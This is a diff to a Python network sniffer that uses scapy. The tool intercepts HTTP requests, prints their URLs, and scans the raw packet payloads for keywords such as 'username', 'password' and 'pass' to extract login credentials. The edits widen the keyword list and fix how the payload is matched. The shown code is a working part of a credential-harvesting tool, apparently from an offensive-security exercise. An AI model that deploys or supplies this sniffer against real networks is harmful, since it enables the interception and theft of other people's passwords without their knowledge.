@@ -24,22 +24,23 @@ def get_login_info (packet):
             # here scapy.Raw is the layer and "load" is the field in that layer
             load = packet[scapy.Raw].load
             username_keywords = ["username", "password",
-                                 "email", "key", "user", "id", "login", "pass"]
+                                 "email", "key", "user", "id", "login", "pass","uname"]
             for keyword in username_keywords:
-                if keyword in load:  # since it is not necessary that all the websites will be sending their credentials using load field only
+                if keyword in str(load):  # since it is not necessary that all the websites will be sending their credentials using load field only
                     # print("\n\n[+] Possible username/password > ",load,"\n\n")
                     #break  # since if the load has more than one keyword it will print the load more than once
                     return load
 
 
 def process_sniffed_packet(packet):
-    print(packet)
     # using HTTP since URLs images videos and passwords which is sent by a web browser is mostly sent by http layer
     # if our packet has a layer and the layer is a http request
     if packet.haslayer(http.HTTPRequest):
         # print(packet.show())
+        print(packet)
+
         URL = get_url(packet)
-        print("[+] HTTP Request >> ", URL)
+        print("\n\n[+] HTTP Request >> ", URL)
 
         login_info=get_login_info(packet)
         if login_info:
